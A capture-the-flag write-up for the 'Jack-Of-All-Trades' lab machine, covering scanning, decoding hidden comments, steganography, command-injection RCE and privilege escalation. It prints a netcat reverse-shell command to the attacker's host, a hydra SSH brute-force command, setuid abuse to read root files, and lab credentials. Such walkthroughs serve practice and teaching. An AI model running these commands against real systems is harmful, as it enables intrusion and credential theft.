# Jack-Of-All-Trades Write-up: Easy

## Nmap

```
nmap -sC -sV <ip> -p-
```

Open ports:
- http: 22. Apache httpd 2.4.10 ((Debian))
- ssh: 80. OpenSSH 6.7p1 Debian 5.

None of the versions appear to be vulnerable.

## HTML page

Strangely, it seems the usual ports for http and ssh have been reversed. Firefox attempted to block the connection to the webserver on port 22, so I had to change the blocker settings in about:config in order for it to allow the connection.

The source code for the home page contains the comment:
```
UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== 
```

Putting this into the base64 command returns the decoded text as:
```
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```
So now we have a password **u?WtKSraq**

## Gobuster

```
gobuster dir -e -u http://<ip>:22 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

Interesting directories:
- **/recovery.php**
- **/assets**

recovery.php contains a login page, with the displayed message *Hello Jack! Did you forget your machine password again?..*. Viewing the source code finds the comment:

```
GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ= 
```

Through some trial and error and the *CyberChef* tool, I managed to decode the comment with base32, followed by hex, and finally ROT13. This gave the message as:

```
Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
```

The link leads to a Wikipedia page on Stegosauria, so I went back to the /assets directory and downloaded the images to look for hidden content.

## Steganography

```
wget http://<ip>:22/assets/stego.jpg
steghide extract -sf stego.jpg 
```

Using the password from the home page's source code as the passphrase, a *creds.txt* file was extracted from the image. It reads:
```
Hehe. Gotcha!

You're on the right path, but wrong image!
```

Oops. I repeated this for the other images in the /assets directory, and finally found:
```
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY
```

This now allows me to login into the site at /recovery.php with these credentials.
The text on the page reads *GET me a 'cmd' and I'll run it for you Future-Jack.*

## RCE & Privilege Escalation to jack

I added a 'cmd' parameter to the site and immediately got code execution. 
```
http://<ip>:22/nnxhweOV/index.php?cmd=nc <my_ip> <port> -e /bin/bash
```

Using netcat I was then able to get a reverse shell on my machine. Now stabilise it:
```
python -c "import pty; pty.spawn('/bin/bash')"
Ctrl-Z
stty raw -echo; fg
reset
```

I then found an interesting password list in /home: **jacks_password_list**. I downloaded this onto my machine and used it to brute force ssh.

```
hydra -l jack -P jacks_password_list 10.10.216.3 ssh -s 80
```

Now we have the credentials! ***jack : ITMJpGGIqg1jn?>@***.
This revealed the first user flag in the image user.jpg.

## Privilege escalation to root

I tried the usual escalation vectors, and found an interesting setuid binary **/usr/bin/strings**. This let me run the following command:

```
strings /root/root.txt
```
And this gave me the root flag :)

I did briefly attempt to get a shell as root by reading /etc/shadow, but the hash wasn't easily crackable so I figured this wasn't intended.
